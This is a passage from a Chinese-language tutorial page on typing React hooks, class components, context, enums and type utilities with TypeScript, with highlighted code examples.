class="hljs-property">type</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;increment&quot;</span>:<br>      <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> + action.<span class="hljs-property">payload</span> &#125;;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;decrement&quot;</span>:<br>      <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> - <span class="hljs-title class_">Number</span>(action.<span class="hljs-property">payload</span>) &#125;;<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(reducer, initialState);<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      Count: &#123;state.count&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123; type: &quot;decrement&quot;, payload: &quot;5&quot; &#125;)&#125;&gt;</span><br><span class="language-xml">        -</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123; type: &quot;increment&quot;, payload: 5 &#125;)&#125;&gt;</span><br><span class="language-xml">        +</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="使用useEffect-和-useLayoutEffect"><a href="#使用useEffect-和-useLayoutEffect" class="headerlink" title="使用useEffect 和 useLayoutEffect"></a>使用useEffect 和 useLayoutEffect</h4><p><code>useEffect</code>用于<code>useLayoutEffect</code>执行<strong>副作用</strong>并返回可选的清理函数，这意味着如果它们不处理返回值，则不需要类型。使用时<code>useEffect</code>，请注意不要返回除函数或之外的任何内容<code>undefined</code>，否则 TypeScript 和 React 都会对你大喊大叫。使用箭头函数时，这可能很微妙：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">DelayedEffect</span>(<span class="hljs-params">props: &#123; timerMs: <span class="hljs-built_in">number</span> &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; timerMs &#125; = props;<br><br>  <span class="hljs-title function_">useEffect</span>(<br>    <span class="hljs-function">() =&gt;</span><br>      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>        <span class="hljs-comment">/* do stuff */</span><br>      &#125;, timerMs),<br>    [timerMs]<br>  );<br>  <span class="hljs-comment">// bad example! setTimeout implicitly returns a number</span><br>  <span class="hljs-comment">// because the arrow function body isn&#x27;t wrapped in curly braces</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">DelayedEffect</span>(<span class="hljs-params">props: &#123; timerMs: <span class="hljs-built_in">number</span> &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; timerMs &#125; = props;<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-comment">/* do stuff */</span><br>    &#125;, timerMs);<br>  &#125;, [timerMs]);<br>  <span class="hljs-comment">// better; use the void keyword to make sure you return undefined</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="使用useRef"><a href="#使用useRef" class="headerlink" title="使用useRef"></a>使用useRef</h4><ol><li>dom元素 <code>const divRef = useRef&lt;HTMLDivElement&gt;(null);</code></li><li>可变值<code>const intervalRef = useRef&lt;number | null&gt;(null);</code></li></ol><h4 id="使用useImperativeHandle"><a href="#使用useImperativeHandle" class="headerlink" title="使用useImperativeHandle"></a>使用useImperativeHandle</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// Countdown.tsx</span><br><br><span class="hljs-comment">// Define the handle types which will be passed to the forwardRef</span><br><span class="hljs-keyword">export</span> type <span class="hljs-title class_">CountdownHandle</span> = &#123;<br>  <span class="hljs-attr">start</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">void</span>;<br>&#125;;<br><br>type <span class="hljs-title class_">CountdownProps</span> = &#123;&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Countdown</span> = forwardRef&lt;<span class="hljs-title class_">CountdownHandle</span>, <span class="hljs-title class_">CountdownProps</span>&gt;(<span class="hljs-function">(<span class="hljs-params">props, ref</span>) =&gt;</span> &#123;<br>  <span class="hljs-title function_">useImperativeHandle</span>(ref, <span class="hljs-function">() =&gt;</span> (&#123;<br>    <span class="hljs-comment">// start() has type inference here</span><br>    <span class="hljs-title function_">start</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Start&quot;</span>);<br>    &#125;,<br>  &#125;));<br><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Countdown<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="自定义钩子"><a href="#自定义钩子" class="headerlink" title="自定义钩子"></a>自定义钩子</h4><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> &#123; useState &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;react&quot;</span>;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useLoading</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [isLoading, setState] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">load</span> = (<span class="hljs-params">aPromise: <span class="hljs-built_in">Promise</span>&lt;<span class="hljs-built_in">any</span>&gt;</span>) =&gt; &#123;<br>    <span class="hljs-title function_">setState</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">return</span> aPromise.<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">setState</span>(<span class="hljs-literal">false</span>));<br>  &#125;;<br>  <span class="hljs-keyword">return</span> [isLoading, load] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>; <span class="hljs-comment">// infers [boolean, typeof load] instead of (boolean | typeof load)[]</span><br>&#125;<br></code></pre></td></tr></table></figure><p>如果您正在编写 React Hooks 库，请不要忘记您还应该公开您的类型以供用户使用。</p><h4 id="React-Hooks-TypeScript-库示例"><a href="#React-Hooks-TypeScript-库示例" class="headerlink" title="React Hooks + TypeScript 库示例"></a>React Hooks + TypeScript 库示例</h4><ul><li><a href="https://github.com/mweststrate/use-st8">https://github.com/mweststrate/use-st8</a></li><li><a href="https://github.com/palmerhq/the-platform">https://github.com/palmerhq/the-platform</a></li><li><a href="https://github.com/sw-yx/hooks">https://github.com/sw-yx/hooks</a></li></ul><h4 id="更多-Hooks-TypeScript-阅读"><a href="#更多-Hooks-TypeScript-阅读" class="headerlink" title="更多 Hooks + TypeScript 阅读"></a>更多 Hooks + TypeScript 阅读</h4><ul><li><a href="https://medium.com/@jrwebdev/react-hooks-in-typescript-88fce7001d0d">https://medium.com/@jrwebdev/react-hooks-in-typescript-88fce7001d0d</a></li><li><a href="https://fettblog.eu/typescript-react/hooks/#useref">https://fettblog.eu/typescript-react/hooks/#useref</a></li></ul><h3 id="4、类组件"><a href="#4、类组件" class="headerlink" title="4、类组件"></a>4、类组件</h3><p>在 TypeScript 中，<code>React.Component</code>是一个泛型类型（又名<code>React.Component&lt;PropType, StateType&gt;</code>），因此您需要为其提供（可选） prop 和 state 类型参数</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span>&lt;&#123; <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span> &#125;, &#123; <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> &#125;&gt; &#123;<br>  state = &#123; <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> &#125;;<br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> this.increment(1)&#125;&gt;</span><br><span class="language-xml">        &#123;this.props.message&#125; &#123;this.state.count&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    );<br>  &#125;<br>  increment = <span class="hljs-function">(<span class="hljs-params">amt: <span class="hljs-built_in">number</span></span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// like this</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> (&#123;<br>      <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> + amt,<br>    &#125;));<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5、context"><a href="#5、context" class="headerlink" title="5、context"></a>5、context</h3><h4 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h4><p>下面是创建包含活动主题的上下文的基本示例。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> &#123; createContext &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;react&quot;</span>;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ThemeContextType</span> = <span class="hljs-string">&quot;light&quot;</span> | <span class="hljs-string">&quot;dark&quot;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = createContext&lt;<span class="hljs-title class_">ThemeContextType</span>&gt;(<span class="hljs-string">&quot;light&quot;</span>);<br></code></pre></td></tr></table></figure><p>用上下文提供者包装需要上下文的组件：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> &#123; useState &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;react&quot;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> [theme, setTheme] = useState&lt;<span class="hljs-title class_">ThemeContextType</span>&gt;(<span class="hljs-string">&quot;light&quot;</span>);<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;theme&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">MyComponent</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span><br>  );<br>&#125;;<br></code></pre></td></tr></table></figure><p>调用<code>useContext</code>以读取并订阅上下文。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> &#123; useContext &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;react&quot;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">MyComponent</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> theme = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);<br><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>The current theme is &#123;theme&#125;.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="没有默认上下文值"><a href="#没有默认上下文值" class="headerlink" title="没有默认上下文值"></a>没有默认上下文值</h4><p>如果您没有任何有意义的默认值，请指定<code>null</code>：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> &#123; createContext &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;react&quot;</span>;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">CurrentUserContextType</span> &#123;<br>  <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">CurrentUserContext</span> = createContext&lt;<span class="hljs-title class_">CurrentUserContextType</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> [currentUser, setCurrentUser] = useState&lt;<span class="hljs-title class_">CurrentUserContextType</span>&gt;(&#123;<br>    <span class="hljs-attr">username</span>: <span class="hljs-string">&quot;filiptammergard&quot;</span>,<br>  &#125;);<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">CurrentUserContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;currentUser&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">MyComponent</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">CurrentUserContext.Provider</span>&gt;</span></span><br>  );<br>&#125;;<br></code></pre></td></tr></table></figure><p>现在上下文的类型可以是<code>null</code>，您会注意到，<code>&#39;currentUser&#39; is possibly &#39;null&#39;</code>如果尝试访问该<code>username</code>属性，您将收到 TypeScript 错误。您可以使用可选链来访问<code>username</code>：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> &#123; useContext &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;react&quot;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">MyComponent</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> currentUser = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">CurrentUserContext</span>);<br><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Name: &#123;currentUser?.username&#125;.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>然而，最好不必检查<code>null</code>，因为我们知道上下文不会是<code>null</code>。一种方法是提供一个自定义挂钩来使用上下文，如果未提供上下文，则会抛出错误：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> &#123; createContext &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;react&quot;</span>;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">CurrentUserContextType</span> &#123;<br>  <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">CurrentUserContext</span> = createContext&lt;<span class="hljs-title class_">CurrentUserContextType</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">useCurrentUser</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> currentUserContext = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">CurrentUserContext</span>);<br><br>  <span class="hljs-keyword">if</span> (!currentUserContext) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<br>      <span class="hljs-string">&quot;useCurrentUser has to be used within &lt;CurrentUserContext.Provider&gt;&quot;</span><br>    );<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> currentUserContext;<br>&#125;;<br></code></pre></td></tr></table></figure><p>使用运行时类型检查的好处是，当提供者未正确包装组件时，可以在控制台中打印清晰的错误消息。<code>currentUser.username</code>现在无需检查即可访问<code>null</code>：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> &#123; useContext &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;react&quot;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">MyComponent</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> currentUser = <span class="hljs-title function_">useCurrentUser</span>();<br><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Username: &#123;currentUser.username&#125;.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="类型断言作为替代方案"><a href="#类型断言作为替代方案" class="headerlink" title="类型断言作为替代方案"></a>类型断言作为替代方案</h4><p>另一种避免检查的方法<code>null</code>是使用类型断言告诉 TypeScript 你知道上下文不是<code>null</code>：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> &#123; useContext &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;react&quot;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">MyComponent</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> currentUser = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">CurrentUserContext</span>);<br><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Name: &#123;currentUser!.username&#125;.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>另一种选择是使用空对象作为默认值并将其转换为预期的上下文类型：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">const</span> <span class="hljs-title class_">CurrentUserContext</span> = createContext&lt;<span class="hljs-title class_">CurrentUserContextType</span>&gt;(<br>  &#123;&#125; <span class="hljs-keyword">as</span> <span class="hljs-title class_">CurrentUserContextType</span><br>);<br></code></pre></td></tr></table></figure><p>您还可以使用非空断言来获得相同的结果：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">const</span> <span class="hljs-title class_">CurrentUserContext</span> = createContext&lt;<span class="hljs-title class_">CurrentUserContextType</span>&gt;(<span class="hljs-literal">null</span>!);<br></code></pre></td></tr></table></figure><p>当您不知道该选择什么时，更喜欢运行时检查并放弃类型断言。</p><h3 id="6、枚举"><a href="#6、枚举" class="headerlink" title="6、枚举"></a>6、枚举</h3><p><strong>我们建议尽可能避免使用枚举</strong>。</p><p>枚举有一些<a href="https://fettblog.eu/tidy-typescript-avoid-enums/">记录在案的问题</a>（TS 团队<a href="https://twitter.com/orta/status/1348966323271987201?s=20">同意</a>）。枚举的一个更简单的替代方法是声明字符串文字的联合类型：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">export</span> <span class="hljs-keyword">declare</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">Position</span> = <span class="hljs-string">&quot;left&quot;</span> | <span class="hljs-string">&quot;right&quot;</span> | <span class="hljs-string">&quot;top&quot;</span> | <span class="hljs-string">&quot;bottom&quot;</span>;<br></code></pre></td></tr></table></figure><p>如果必须使用枚举，请记住 TypeScript 中的枚举默认为数字。您通常希望将它们用作字符串：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">export</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">ButtonSizes</span> &#123;<br>  <span class="hljs-keyword">default</span> = <span class="hljs-string">&quot;default&quot;</span>,<br>  small = <span class="hljs-string">&quot;small&quot;</span>,<br>  large = <span class="hljs-string">&quot;large&quot;</span>,<br>&#125;<br><br><span class="hljs-comment">// usage</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">PrimaryButton</span> = (<span class="hljs-params"></span><br><span class="hljs-params">  props: Props &amp; React.HTMLProps&lt;HTMLButtonElement&gt;</span><br><span class="hljs-params"></span>) =&gt; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&#123;ButtonSizes.default&#125;</span> &#123;<span class="hljs-attr">...props</span>&#125; /&gt;</span></span>;<br></code></pre></td></tr></table></figure><h3 id="7、类型"><a href="#7、类型" class="headerlink" title="7、类型"></a>7、类型</h3><h4 id="使用推断"><a href="#使用推断" class="headerlink" title="使用推断"></a>使用推断</h4><p>依靠 TypeScript 的类型推断非常棒……直到您意识到需要推断出的类型，并且必须返回并显式声明类型&#x2F;接口，以便可以导出它们以供重用。</p><p>幸运的是，有了<code>typeof</code>，您就不必这样做了。只需将其用于任何值即可：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(&#123;<br>  <span class="hljs-attr">foo</span>: <span class="hljs-number">1</span>,<br>  <span class="hljs-attr">bar</span>: <span class="hljs-number">2</span>,<br>&#125;); <span class="hljs-comment">// state&#x27;s type inferred to be &#123;foo: number, bar: number&#125;</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">someMethod</span> = (<span class="hljs-params">obj: <span class="hljs-keyword">typeof</span> state</span>) =&gt; &#123;<br>  <span class="hljs-comment">// grabbing the type of state even though it was inferred</span><br>  <span class="hljs-comment">// some code using obj</span><br>  <span class="hljs-title function_">setState</span>(obj); <span class="hljs-comment">// this works</span><br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="使用部分"><a href="#使用部分" class="headerlink" title="使用部分"></a>使用部分</h4><p>在 React 中使用切片状态和 props 很常见。同样，如果您使用泛型类型，您实际上不必显式地重新定义您的类型<code>Partial</code>：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(&#123;<br>  <span class="hljs-attr">foo</span>: <span class="hljs-number">1</span>,<br>  <span class="hljs-attr">bar</span>: <span class="hljs-number">2</span>,<br>&#125;); <span class="hljs-comment">// state&#x27;s type inferred to be &#123;foo: number, bar: number&#125;</span><br><br><span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> stale state merging is not actually encouraged in useState</span><br><span class="hljs-comment">// we are just demonstrating how to use Partial here</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">partialStateUpdate</span> = (<span class="hljs-params">obj: Partial&lt;<span class="hljs-keyword">typeof</span> state&gt;</span>) =&gt;<br>  <span class="hljs-title function_">setState</span>(&#123; ...state, ...obj &#125;);<br><br><span class="hljs-comment">// later on...</span><br><span class="hljs-title function_">partialStateUpdate</span>(&#123; <span class="hljs-attr">foo</span>: <span class="hljs-number">2</span> &#125;); <span class="hljs-comment">// this works</span><br></code></pre></td></tr></table></figure><h4 id="我需要的类型没有导出"><a href="#我需要的类型没有导出" class="headerlink" title="我需要的类型没有导出"></a>我需要的类型没有导出</h4><p>这可能很烦人，但这里有一些获取类型的方法！</p><ul><li>获取组件的 Prop 类型：使用<code>React.ComponentProps</code>和<code>typeof</code>，以及可选的<code>Omit</code>任何重叠类型</li></ul><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Button</span> &#125; <span class="hljs-keyword">from</span> <span 